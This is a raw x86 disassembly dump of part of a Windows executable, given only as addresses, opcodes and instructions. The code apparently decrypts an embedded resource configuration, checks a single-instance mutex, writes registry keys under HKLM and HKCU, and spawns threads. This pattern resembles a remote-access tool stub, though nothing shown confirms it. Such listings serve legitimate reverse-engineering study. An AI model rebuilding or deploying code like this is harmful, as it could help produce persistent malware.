  404ebb:	b9 68 1a 41 00       	mov    $0x411a68,%ecx
  404ec0:	ff 25 9c d2 40 00    	jmp    *0x40d29c
  404ec6:	e8 05 00 00 00       	call   0x404ed0
  404ecb:	e9 15 00 00 00       	jmp    0x404ee5
  404ed0:	55                   	push   %ebp
  404ed1:	8b ec                	mov    %esp,%ebp
  404ed3:	51                   	push   %ecx
  404ed4:	8d 45 ff             	lea    -0x1(%ebp),%eax
  404ed7:	b9 48 1a 41 00       	mov    $0x411a48,%ecx
  404edc:	50                   	push   %eax
  404edd:	ff 15 dc d2 40 00    	call   *0x40d2dc
  404ee3:	c9                   	leave
  404ee4:	c3                   	ret
  404ee5:	68 f1 4e 40 00       	push   $0x404ef1
  404eea:	e8 c9 74 00 00       	call   0x40c3b8
  404eef:	59                   	pop    %ecx
  404ef0:	c3                   	ret
  404ef1:	b9 48 1a 41 00       	mov    $0x411a48,%ecx
  404ef6:	ff 25 d8 d2 40 00    	jmp    *0x40d2d8
  404efc:	55                   	push   %ebp
  404efd:	8b ec                	mov    %esp,%ebp
  404eff:	81 ec c0 00 00 00    	sub    $0xc0,%esp
  404f05:	53                   	push   %ebx
  404f06:	56                   	push   %esi
  404f07:	8d 45 cc             	lea    -0x34(%ebp),%eax
  404f0a:	57                   	push   %edi
  404f0b:	50                   	push   %eax
  404f0c:	e8 2a 04 00 00       	call   0x40533b
  404f11:	83 ec 0c             	sub    $0xc,%esp
  404f14:	8d 45 ff             	lea    -0x1(%ebp),%eax
  404f17:	8b cc                	mov    %esp,%ecx
  404f19:	50                   	push   %eax
  404f1a:	ff 35 24 11 41 00    	push   0x411124
  404f20:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  404f26:	83 ec 10             	sub    $0x10,%esp
  404f29:	8d 45 cc             	lea    -0x34(%ebp),%eax
  404f2c:	8b cc                	mov    %esp,%ecx
  404f2e:	50                   	push   %eax
  404f2f:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  404f35:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404f38:	50                   	push   %eax
  404f39:	e8 af 64 00 00       	call   0x40b3ed
  404f3e:	83 c4 24             	add    $0x24,%esp
  404f41:	be 20 1a 41 00       	mov    $0x411a20,%esi
  404f46:	8b ce                	mov    %esi,%ecx
  404f48:	50                   	push   %eax
  404f49:	e8 87 09 00 00       	call   0x4058d5
  404f4e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404f51:	e8 da cb ff ff       	call   0x401b30
  404f56:	8b 7d 10             	mov    0x10(%ebp),%edi
  404f59:	b8 18 db 40 00       	mov    $0x40db18,%eax
  404f5e:	33 db                	xor    %ebx,%ebx
  404f60:	8a 17                	mov    (%edi),%dl
  404f62:	8a ca                	mov    %dl,%cl
  404f64:	3a 10                	cmp    (%eax),%dl
  404f66:	75 1a                	jne    0x404f82
  404f68:	3a cb                	cmp    %bl,%cl
  404f6a:	74 12                	je     0x404f7e
  404f6c:	8a 57 01             	mov    0x1(%edi),%dl
  404f6f:	8a ca                	mov    %dl,%cl
  404f71:	3a 50 01             	cmp    0x1(%eax),%dl
  404f74:	75 0c                	jne    0x404f82
  404f76:	47                   	inc    %edi
  404f77:	47                   	inc    %edi
  404f78:	40                   	inc    %eax
  404f79:	40                   	inc    %eax
  404f7a:	3a cb                	cmp    %bl,%cl
  404f7c:	75 e2                	jne    0x404f60
  404f7e:	33 c0                	xor    %eax,%eax
  404f80:	eb 05                	jmp    0x404f87
  404f82:	1b c0                	sbb    %eax,%eax
  404f84:	83 d8 ff             	sbb    $0xffffffff,%eax
  404f87:	3b c3                	cmp    %ebx,%eax
  404f89:	75 5f                	jne    0x404fea
  404f8b:	6a 01                	push   $0x1
  404f8d:	6a 12                	push   $0x12
  404f8f:	68 04 db 40 00       	push   $0x40db04
  404f94:	8d 8d 40 ff ff ff    	lea    -0xc0(%ebp),%ecx
  404f9a:	ff 15 c4 d1 40 00    	call   *0x40d1c4
  404fa0:	6a 34                	push   $0x34
  404fa2:	8b ce                	mov    %esi,%ecx
  404fa4:	e8 b6 cb ff ff       	call   0x401b5f
  404fa9:	8b c8                	mov    %eax,%ecx
  404fab:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  404fb1:	50                   	push   %eax
  404fb2:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
  404fb8:	50                   	push   %eax
  404fb9:	ff 15 c0 d1 40 00    	call   *0x40d1c0
  404fbf:	59                   	pop    %ecx
  404fc0:	59                   	pop    %ecx
  404fc1:	8d 8d 40 ff ff ff    	lea    -0xc0(%ebp),%ecx
  404fc7:	ff 15 bc d1 40 00    	call   *0x40d1bc
  404fcd:	8d 8d 40 ff ff ff    	lea    -0xc0(%ebp),%ecx
  404fd3:	ff 15 b8 d1 40 00    	call   *0x40d1b8
  404fd9:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404fdc:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  404fe2:	6a 01                	push   $0x1
  404fe4:	58                   	pop    %eax
  404fe5:	e9 4a 03 00 00       	jmp    0x405334
  404fea:	6a 03                	push   $0x3
  404fec:	8b ce                	mov    %esi,%ecx
  404fee:	e8 6c cb ff ff       	call   0x401b5f
  404ff3:	8b c8                	mov    %eax,%ecx
  404ff5:	ff 15 bc d2 40 00    	call   *0x40d2bc
  404ffb:	38 18                	cmp    %bl,(%eax)
  404ffd:	68 cc d5 40 00       	push   $0x40d5cc
  405002:	6a 0e                	push   $0xe
  405004:	8b ce                	mov    %esi,%ecx
  405006:	0f 95 c0             	setne  %al
  405009:	a2 a9 17 41 00       	mov    %al,0x4117a9
  40500e:	e8 4c cb ff ff       	call   0x401b5f
  405013:	50                   	push   %eax
  405014:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405017:	68 f8 da 40 00       	push   $0x40daf8
  40501c:	50                   	push   %eax
  40501d:	e8 a2 76 00 00       	call   0x40c6c4
  405022:	83 c4 0c             	add    $0xc,%esp
  405025:	50                   	push   %eax
  405026:	8d 45 dc             	lea    -0x24(%ebp),%eax
  405029:	50                   	push   %eax
  40502a:	e8 71 76 00 00       	call   0x40c6a0
  40502f:	83 c4 0c             	add    $0xc,%esp
  405032:	b9 c8 17 41 00       	mov    $0x4117c8,%ecx
  405037:	50                   	push   %eax
  405038:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  40503e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405041:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405047:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40504a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405050:	6a 0e                	push   $0xe
  405052:	8b ce                	mov    %esi,%ecx
  405054:	e8 06 cb ff ff       	call   0x401b5f
  405059:	bf 58 1a 41 00       	mov    $0x411a58,%edi
  40505e:	50                   	push   %eax
  40505f:	8b cf                	mov    %edi,%ecx
  405061:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  405067:	8b cf                	mov    %edi,%ecx
  405069:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40506f:	50                   	push   %eax
  405070:	6a 01                	push   $0x1
  405072:	53                   	push   %ebx
  405073:	ff 15 10 d1 40 00    	call   *0x40d110
  405079:	ff 15 14 d1 40 00    	call   *0x40d114
  40507f:	3d b7 00 00 00       	cmp    $0xb7,%eax
  405084:	75 08                	jne    0x40508e
  405086:	6a 01                	push   $0x1
  405088:	5b                   	pop    %ebx
  405089:	e9 9b 02 00 00       	jmp    0x405329
  40508e:	e8 8d 03 00 00       	call   0x405420
  405093:	68 04 01 00 00       	push   $0x104
  405098:	68 ec 17 41 00       	push   $0x4117ec
  40509d:	53                   	push   %ebx
  40509e:	ff 15 1c d1 40 00    	call   *0x40d11c
  4050a4:	e8 44 64 00 00       	call   0x40b4ed
  4050a9:	53                   	push   %ebx
  4050aa:	a2 5c 1d 41 00       	mov    %al,0x411d5c
  4050af:	68 ec da 40 00       	push   $0x40daec
  4050b4:	68 bc da 40 00       	push   $0x40dabc
  4050b9:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4050bc:	68 02 00 00 80       	push   $0x80000002
  4050c1:	50                   	push   %eax
  4050c2:	e8 53 0d 00 00       	call   0x405e1a
  4050c7:	83 c4 14             	add    $0x14,%esp
  4050ca:	bf 48 1a 41 00       	mov    $0x411a48,%edi
  4050cf:	8b cf                	mov    %edi,%ecx
  4050d1:	50                   	push   %eax
  4050d2:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  4050d8:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4050db:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4050e1:	38 1d 5c 1d 41 00    	cmp    %bl,0x411d5c
  4050e7:	74 07                	je     0x4050f0
  4050e9:	68 b0 da 40 00       	push   $0x40dab0
  4050ee:	eb 05                	jmp    0x4050f5
  4050f0:	68 a4 da 40 00       	push   $0x40daa4
  4050f5:	8b cf                	mov    %edi,%ecx
  4050f7:	ff 15 7c d2 40 00    	call   *0x40d27c
  4050fd:	a1 10 1a 41 00       	mov    0x411a10,%eax
  405102:	3b c3                	cmp    %ebx,%eax
  405104:	74 07                	je     0x40510d
  405106:	ff d0                	call   *%eax
  405108:	a3 2c 11 41 00       	mov    %eax,0x41112c
  40510d:	6a 0b                	push   $0xb
  40510f:	8b ce                	mov    %esi,%ecx
  405111:	e8 49 ca ff ff       	call   0x401b5f
  405116:	50                   	push   %eax
  405117:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40511a:	50                   	push   %eax
  40511b:	e8 da 61 00 00       	call   0x40b2fa
  405120:	59                   	pop    %ecx
  405121:	59                   	pop    %ecx
  405122:	50                   	push   %eax
  405123:	b9 d8 17 41 00       	mov    $0x4117d8,%ecx
  405128:	ff 15 50 d2 40 00    	call   *0x40d250
  40512e:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405131:	ff 15 9c d2 40 00    	call   *0x40d29c
  405137:	6a 04                	push   $0x4
  405139:	8b ce                	mov    %esi,%ecx
  40513b:	e8 1f ca ff ff       	call   0x401b5f
  405140:	8b c8                	mov    %eax,%ecx
  405142:	ff 15 bc d2 40 00    	call   *0x40d2bc
  405148:	38 18                	cmp    %bl,(%eax)
  40514a:	6a 05                	push   $0x5
  40514c:	8b ce                	mov    %esi,%ecx
  40514e:	0f 95 c0             	setne  %al
  405151:	a2 e8 17 41 00       	mov    %al,0x4117e8
  405156:	e8 04 ca ff ff       	call   0x401b5f
  40515b:	8b c8                	mov    %eax,%ecx
  40515d:	ff 15 bc d2 40 00    	call   *0x40d2bc
  405163:	38 18                	cmp    %bl,(%eax)
  405165:	6a 06                	push   $0x6
  405167:	8b ce                	mov    %esi,%ecx
  405169:	0f 95 c0             	setne  %al
  40516c:	a2 f5 19 41 00       	mov    %al,0x4119f5
  405171:	e8 e9 c9 ff ff       	call   0x401b5f
  405176:	8b c8                	mov    %eax,%ecx
  405178:	ff 15 bc d2 40 00    	call   *0x40d2bc
  40517e:	38 18                	cmp    %bl,(%eax)
  405180:	6a 07                	push   $0x7
  405182:	8b ce                	mov    %esi,%ecx
  405184:	0f 95 c0             	setne  %al
  405187:	a2 f4 19 41 00       	mov    %al,0x4119f4
  40518c:	e8 ce c9 ff ff       	call   0x401b5f
  405191:	8b c8                	mov    %eax,%ecx
  405193:	ff 15 bc d2 40 00    	call   *0x40d2bc
  405199:	38 18                	cmp    %bl,(%eax)
  40519b:	6a 08                	push   $0x8
  40519d:	8b ce                	mov    %esi,%ecx
  40519f:	0f 95 c0             	setne  %al
  4051a2:	a2 c0 17 41 00       	mov    %al,0x4117c0
  4051a7:	e8 b3 c9 ff ff       	call   0x401b5f
  4051ac:	8b c8                	mov    %eax,%ecx
  4051ae:	ff 15 bc d2 40 00    	call   *0x40d2bc
  4051b4:	38 18                	cmp    %bl,(%eax)
  4051b6:	6a 03                	push   $0x3
  4051b8:	8b ce                	mov    %esi,%ecx
  4051ba:	0f 95 c0             	setne  %al
  4051bd:	a2 a8 17 41 00       	mov    %al,0x4117a8
  4051c2:	e8 98 c9 ff ff       	call   0x401b5f
  4051c7:	8b c8                	mov    %eax,%ecx
  4051c9:	ff 15 bc d2 40 00    	call   *0x40d2bc
  4051cf:	38 18                	cmp    %bl,(%eax)
  4051d1:	0f 84 90 00 00 00    	je     0x405267
  4051d7:	6a 30                	push   $0x30
  4051d9:	8b ce                	mov    %esi,%ecx
  4051db:	e8 7f c9 ff ff       	call   0x401b5f
  4051e0:	50                   	push   %eax
  4051e1:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4051e4:	50                   	push   %eax
  4051e5:	e8 10 61 00 00       	call   0x40b2fa
  4051ea:	59                   	pop    %ecx
  4051eb:	59                   	pop    %ecx
  4051ec:	8b c8                	mov    %eax,%ecx
  4051ee:	ff 15 98 d2 40 00    	call   *0x40d298
  4051f4:	50                   	push   %eax
  4051f5:	ff 15 40 d3 40 00    	call   *0x40d340
  4051fb:	59                   	pop    %ecx
  4051fc:	8b f8                	mov    %eax,%edi
  4051fe:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405201:	ff 15 9c d2 40 00    	call   *0x40d29c
  405207:	3b fb                	cmp    %ebx,%edi
  405209:	74 5c                	je     0x405267
  40520b:	6a 30                	push   $0x30
  40520d:	8b ce                	mov    %esi,%ecx
  40520f:	e8 4b c9 ff ff       	call   0x401b5f
  405214:	50                   	push   %eax
  405215:	8d 45 dc             	lea    -0x24(%ebp),%eax
  405218:	50                   	push   %eax
  405219:	e8 dc 60 00 00       	call   0x40b2fa
  40521e:	59                   	pop    %ecx
  40521f:	59                   	pop    %ecx
  405220:	8b c8                	mov    %eax,%ecx
  405222:	ff 15 98 d2 40 00    	call   *0x40d298
  405228:	50                   	push   %eax
  405229:	6a 09                	push   $0x9
  40522b:	8b ce                	mov    %esi,%ecx
  40522d:	e8 2d c9 ff ff       	call   0x401b5f
  405232:	8b c8                	mov    %eax,%ecx
  405234:	ff 15 bc d2 40 00    	call   *0x40d2bc
  40523a:	8a 00                	mov    (%eax),%al
  40523c:	50                   	push   %eax
  40523d:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405240:	50                   	push   %eax
  405241:	e8 93 f9 ff ff       	call   0x404bd9
  405246:	83 c4 0c             	add    $0xc,%esp
  405249:	b9 f8 19 41 00       	mov    $0x4119f8,%ecx
  40524e:	50                   	push   %eax
  40524f:	ff 15 50 d2 40 00    	call   *0x40d250
  405255:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405258:	ff 15 9c d2 40 00    	call   *0x40d29c
  40525e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405261:	ff 15 9c d2 40 00    	call   *0x40d29c
  405267:	6a 01                	push   $0x1
  405269:	8d 45 13             	lea    0x13(%ebp),%eax
  40526c:	83 ec 10             	sub    $0x10,%esp
  40526f:	8b ce                	mov    %esi,%ecx
  405271:	8b fc                	mov    %esp,%edi
  405273:	50                   	push   %eax
  405274:	6a 34                	push   $0x34
  405276:	e8 e4 c8 ff ff       	call   0x401b5f
  40527b:	8b c8                	mov    %eax,%ecx
  40527d:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  405283:	50                   	push   %eax
  405284:	8b cf                	mov    %edi,%ecx
  405286:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  40528c:	68 9c da 40 00       	push   $0x40da9c
  405291:	b9 c8 17 41 00       	mov    $0x4117c8,%ecx
  405296:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40529c:	50                   	push   %eax
  40529d:	68 01 00 00 80       	push   $0x80000001
  4052a2:	e8 e6 0c 00 00       	call   0x405f8d
  4052a7:	83 c4 20             	add    $0x20,%esp
  4052aa:	8b ce                	mov    %esi,%ecx
  4052ac:	6a 28                	push   $0x28
  4052ae:	e8 ac c8 ff ff       	call   0x401b5f
  4052b3:	8b c8                	mov    %eax,%ecx
  4052b5:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4052bb:	50                   	push   %eax
  4052bc:	ff 15 58 d3 40 00    	call   *0x40d358
  4052c2:	8b 35 58 d1 40 00    	mov    0x40d158,%esi
  4052c8:	3c 02                	cmp    $0x2,%al
  4052ca:	59                   	pop    %ecx
  4052cb:	a2 18 1a 41 00       	mov    %al,0x411a18
  4052d0:	75 04                	jne    0x4052d6
  4052d2:	6a 01                	push   $0x1
  4052d4:	eb 05                	jmp    0x4052db
  4052d6:	3c 01                	cmp    $0x1,%al
  4052d8:	75 13                	jne    0x4052ed
  4052da:	53                   	push   %ebx
  4052db:	e8 a2 6f 00 00       	call   0x40c282
  4052e0:	59                   	pop    %ecx
  4052e1:	53                   	push   %ebx
  4052e2:	53                   	push   %ebx
  4052e3:	53                   	push   %ebx
  4052e4:	68 54 c0 40 00       	push   $0x40c054
  4052e9:	53                   	push   %ebx
  4052ea:	53                   	push   %ebx
  4052eb:	ff d6                	call   *%esi
  4052ed:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4052f0:	50                   	push   %eax
  4052f1:	e8 22 5a 00 00       	call   0x40ad18
  4052f6:	59                   	pop    %ecx
  4052f7:	50                   	push   %eax
  4052f8:	b9 68 1a 41 00       	mov    $0x411a68,%ecx
  4052fd:	ff 15 50 d2 40 00    	call   *0x40d250
  405303:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405306:	ff 15 9c d2 40 00    	call   *0x40d29c
  40530c:	a1 40 1a 41 00       	mov    0x411a40,%eax
  405311:	3b c3                	cmp    %ebx,%eax
  405313:	74 03                	je     0x405318
  405315:	53                   	push   %ebx
  405316:	ff d0                	call   *%eax
  405318:	53                   	push   %ebx
  405319:	53                   	push   %ebx
  40531a:	53                   	push   %ebx
  40531b:	68 2d 55 40 00       	push   $0x40552d
  405320:	53                   	push   %ebx
  405321:	53                   	push   %ebx
  405322:	ff d6                	call   *%esi
  405324:	e8 a6 1c 00 00       	call   0x406fcf
  405329:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40532c:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405332:	8b c3                	mov    %ebx,%eax
  405334:	5f                   	pop    %edi
  405335:	5e                   	pop    %esi
  405336:	5b                   	pop    %ebx
  405337:	c9                   	leave
  405338:	c2 10 00             	ret    $0x10
  40533b:	55                   	push   %ebp
  40533c:	8b ec                	mov    %esp,%ebp
  40533e:	81 ec 34 04 00 00    	sub    $0x434,%esp
  405344:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  405348:	53                   	push   %ebx
  405349:	56                   	push   %esi
  40534a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40534d:	57                   	push   %edi
  40534e:	50                   	push   %eax
  40534f:	e8 9f 01 00 00       	call   0x4054f3
  405354:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405357:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40535a:	0f b6 18             	movzbl (%eax),%ebx
  40535d:	53                   	push   %ebx
  40535e:	ff 15 7c d3 40 00    	call   *0x40d37c
  405364:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405367:	59                   	pop    %ecx
  405368:	59                   	pop    %ecx
  405369:	8b f8                	mov    %eax,%edi
  40536b:	8b cb                	mov    %ebx,%ecx
  40536d:	8d 72 01             	lea    0x1(%edx),%esi
  405370:	8b d1                	mov    %ecx,%edx
  405372:	89 45 ec             	mov    %eax,-0x14(%ebp)
  405375:	c1 e9 02             	shr    $0x2,%ecx
  405378:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40537a:	8b ca                	mov    %edx,%ecx
  40537c:	83 e1 03             	and    $0x3,%ecx
  40537f:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  405381:	8d 4d f7             	lea    -0x9(%ebp),%ecx
  405384:	51                   	push   %ecx
  405385:	53                   	push   %ebx
  405386:	50                   	push   %eax
  405387:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40538a:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  405390:	50                   	push   %eax
  405391:	b9 30 1a 41 00       	mov    $0x411a30,%ecx
  405396:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  40539c:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40539f:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4053a5:	83 c8 ff             	or     $0xffffffff,%eax
  4053a8:	2b c3                	sub    %ebx,%eax
  4053aa:	01 45 fc             	add    %eax,-0x4(%ebp)
  4053ad:	ff 75 fc             	push   -0x4(%ebp)
  4053b0:	ff 15 7c d3 40 00    	call   *0x40d37c
  4053b6:	8b f8                	mov    %eax,%edi
  4053b8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4053bb:	59                   	pop    %ecx
  4053bc:	89 7d f0             	mov    %edi,-0x10(%ebp)
  4053bf:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4053c2:	8d 74 03 01          	lea    0x1(%ebx,%eax,1),%esi
  4053c6:	8b c1                	mov    %ecx,%eax
  4053c8:	53                   	push   %ebx
  4053c9:	c1 e9 02             	shr    $0x2,%ecx
  4053cc:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4053ce:	ff 75 ec             	push   -0x14(%ebp)
  4053d1:	8b c8                	mov    %eax,%ecx
  4053d3:	83 e1 03             	and    $0x3,%ecx
  4053d6:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4053d8:	8d 8d cc fb ff ff    	lea    -0x434(%ebp),%ecx
  4053de:	e8 9a cc ff ff       	call   0x40207d
  4053e3:	ff 75 fc             	push   -0x4(%ebp)
  4053e6:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4053e9:	8d 8d cc fb ff ff    	lea    -0x434(%ebp),%ecx
  4053ef:	ff 75 f0             	push   -0x10(%ebp)
  4053f2:	50                   	push   %eax
  4053f3:	e8 88 cd ff ff       	call   0x402180
  4053f8:	ff 75 f0             	push   -0x10(%ebp)
  4053fb:	ff 15 80 d3 40 00    	call   *0x40d380
  405401:	59                   	pop    %ecx
  405402:	8d 45 dc             	lea    -0x24(%ebp),%eax
  405405:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405408:	50                   	push   %eax
  405409:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40540f:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405412:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405418:	8b 45 08             	mov    0x8(%ebp),%eax
  40541b:	5f                   	pop    %edi
  40541c:	5e                   	pop    %esi
  40541d:	5b                   	pop    %ebx
  40541e:	c9                   	leave
  40541f:	c3                   	ret
  405420:	53                   	push   %ebx
  405421:	8b 1d 24 d1 40 00    	mov    0x40d124,%ebx
  405427:	56                   	push   %esi
  405428:	57                   	push   %edi
  405429:	68 d4 db 40 00       	push   $0x40dbd4
  40542e:	68 c8 db 40 00       	push   $0x40dbc8
  405433:	ff d3                	call   *%ebx
  405435:	8b 35 28 d1 40 00    	mov    0x40d128,%esi
  40543b:	50                   	push   %eax
  40543c:	ff d6                	call   *%esi
  40543e:	8b 3d 0c d1 40 00    	mov    0x40d10c,%edi
  405444:	a3 0c 1a 41 00       	mov    %eax,0x411a0c
  405449:	85 c0                	test   %eax,%eax
  40544b:	75 14                	jne    0x405461
  40544d:	68 d4 db 40 00       	push   $0x40dbd4
  405452:	68 b8 db 40 00       	push   $0x40dbb8
  405457:	ff d7                	call   *%edi
  405459:	50                   	push   %eax
  40545a:	ff d6                	call   *%esi
  40545c:	a3 0c 1a 41 00       	mov    %eax,0x411a0c
  405461:	68 a0 db 40 00       	push   $0x40dba0
  405466:	68 c8 db 40 00       	push   $0x40dbc8
  40546b:	ff d3                	call   *%ebx
  40546d:	50                   	push   %eax
  40546e:	ff d6                	call   *%esi
  405470:	83 3d 0c 1a 41 00 00 	cmpl   $0x0,0x411a0c
  405477:	a3 08 1a 41 00       	mov    %eax,0x411a08
  40547c:	75 14                	jne    0x405492
  40547e:	68 a0 db 40 00       	push   $0x40dba0
  405483:	68 b8 db 40 00       	push   $0x40dbb8
  405488:	ff d7                	call   *%edi
  40548a:	50                   	push   %eax
  40548b:	ff d6                	call   *%esi
  40548d:	a3 08 1a 41 00       	mov    %eax,0x411a08
  405492:	68 88 db 40 00       	push   $0x40db88
  405497:	68 78 db 40 00       	push   $0x40db78
  40549c:	ff d3                	call   *%ebx
  40549e:	50                   	push   %eax
  40549f:	ff d6                	call   *%esi
  4054a1:	bb 6c db 40 00       	mov    $0x40db6c,%ebx
  4054a6:	68 5c db 40 00       	push   $0x40db5c
  4054ab:	53                   	push   %ebx
  4054ac:	a3 14 1a 41 00       	mov    %eax,0x411a14
  4054b1:	ff d7                	call   *%edi
  4054b3:	50                   	push   %eax
  4054b4:	ff d6                	call   *%esi
  4054b6:	68 48 db 40 00       	push   $0x40db48
  4054bb:	53                   	push   %ebx
  4054bc:	a3 60 1d 41 00       	mov    %eax,0x411d60
  4054c1:	ff d7                	call   *%edi
  4054c3:	50                   	push   %eax
  4054c4:	ff d6                	call   *%esi
  4054c6:	68 38 db 40 00       	push   $0x40db38
  4054cb:	68 30 db 40 00       	push   $0x40db30
  4054d0:	a3 64 1d 41 00       	mov    %eax,0x411d64
  4054d5:	ff d7                	call   *%edi
  4054d7:	50                   	push   %eax
  4054d8:	ff d6                	call   *%esi
  4054da:	68 1c db 40 00       	push   $0x40db1c
  4054df:	53                   	push   %ebx
  4054e0:	a3 10 1a 41 00       	mov    %eax,0x411a10
  4054e5:	ff d7                	call   *%edi
  4054e7:	50                   	push   %eax
  4054e8:	ff d6                	call   *%esi
  4054ea:	5f                   	pop    %edi
  4054eb:	5e                   	pop    %esi
  4054ec:	a3 40 1a 41 00       	mov    %eax,0x411a40
  4054f1:	5b                   	pop    %ebx
  4054f2:	c3                   	ret
  4054f3:	55                   	push   %ebp
  4054f4:	8b ec                	mov    %esp,%ebp
  4054f6:	56                   	push   %esi
  4054f7:	57                   	push   %edi
  4054f8:	6a 0a                	push   $0xa
  4054fa:	68 ec db 40 00       	push   $0x40dbec
  4054ff:	6a 00                	push   $0x0
  405501:	ff 15 a8 d0 40 00    	call   *0x40d0a8
  405507:	8b f8                	mov    %eax,%edi
  405509:	57                   	push   %edi
  40550a:	6a 00                	push   $0x0
  40550c:	ff 15 d8 d0 40 00    	call   *0x40d0d8
  405512:	50                   	push   %eax
  405513:	ff 15 04 d1 40 00    	call   *0x40d104
  405519:	57                   	push   %edi
  40551a:	6a 00                	push   $0x0
  40551c:	8b f0                	mov    %eax,%esi
  40551e:	ff 15 08 d1 40 00    	call   *0x40d108
  405524:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405527:	5f                   	pop    %edi
  405528:	89 31                	mov    %esi,(%ecx)
  40552a:	5e                   	pop    %esi
  40552b:	5d                   	pop    %ebp
  40552c:	c3                   	ret
  40552d:	55                   	push   %ebp
  40552e:	8b ec                	mov    %esp,%ebp
  405530:	83 ec 28             	sub    $0x28,%esp
  405533:	53                   	push   %ebx
  405534:	56                   	push   %esi
  405535:	57                   	push   %edi
  405536:	bf c8 17 41 00       	mov    $0x4117c8,%edi
  40553b:	be 01 00 00 80       	mov    $0x80000001,%esi
  405540:	bb 24 dc 40 00       	mov    $0x40dc24,%ebx
  405545:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  405549:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40554c:	50                   	push   %eax
  40554d:	68 18 dc 40 00       	push   $0x40dc18
  405552:	8b cf                	mov    %edi,%ecx
  405554:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40555a:	50                   	push   %eax
  40555b:	56                   	push   %esi
  40555c:	e8 5f 08 00 00       	call   0x405dc0
  405561:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405564:	83 c4 10             	add    $0x10,%esp
  405567:	48                   	dec    %eax
  405568:	74 11                	je     0x40557b
  40556a:	48                   	dec    %eax
  40556b:	0f 84 89 00 00 00    	je     0x4055fa
  405571:	48                   	dec    %eax
  405572:	75 76                	jne    0x4055ea
  405574:	e8 a8 ee ff ff       	call   0x404421
  405579:	eb 6f                	jmp    0x4055ea
  40557b:	6a 01                	push   $0x1
  40557d:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405580:	83 ec 10             	sub    $0x10,%esp
  405583:	8b cc                	mov    %esp,%ecx
  405585:	50                   	push   %eax
  405586:	68 ec 17 41 00       	push   $0x4117ec
  40558b:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  405591:	68 04 dc 40 00       	push   $0x40dc04
  405596:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405599:	68 c8 17 41 00       	push   $0x4117c8
  40559e:	50                   	push   %eax
  40559f:	e8 6a 5c 00 00       	call   0x40b20e
  4055a4:	59                   	pop    %ecx
  4055a5:	59                   	pop    %ecx
  4055a6:	8b c8                	mov    %eax,%ecx
  4055a8:	ff 15 98 d2 40 00    	call   *0x40d298
  4055ae:	50                   	push   %eax
  4055af:	56                   	push   %esi
  4055b0:	e8 89 0a 00 00       	call   0x40603e
  4055b5:	83 c4 20             	add    $0x20,%esp
  4055b8:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4055bb:	ff 15 9c d2 40 00    	call   *0x40d29c
  4055c1:	6a 01                	push   $0x1
  4055c3:	8d 45 fe             	lea    -0x2(%ebp),%eax
  4055c6:	83 ec 10             	sub    $0x10,%esp
  4055c9:	8b cc                	mov    %esp,%ecx
  4055cb:	50                   	push   %eax
  4055cc:	68 f8 db 40 00       	push   $0x40dbf8
  4055d1:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  4055d7:	53                   	push   %ebx
  4055d8:	8b cf                	mov    %edi,%ecx
  4055da:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4055e0:	50                   	push   %eax
  4055e1:	56                   	push   %esi
